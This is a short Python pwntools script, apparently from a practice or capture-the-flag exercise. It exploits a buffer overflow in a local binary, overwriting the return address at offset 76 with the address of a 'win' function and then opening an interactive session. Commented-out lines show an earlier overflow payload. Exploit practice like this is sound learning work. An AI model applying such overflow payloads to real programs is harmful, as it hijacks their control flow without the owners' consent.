from pwn import *

executable_name = "./a.out"


# objdump -d a.out
# 0000000100000e80
# elf = ELF(executable_name)
win = 0x0000000100000e80

p = process(executable_name)

offset = 76
payload = flat({offset: p64(win)})

# log.info(p.recvline())

# buffer_length = 300
# payload = b"A" * buffer_length + b"\x37\x13\x00\x00"
# print(f"payload: {payload}")
p.sendline(payload)
p.interactive()
# # p.interactive()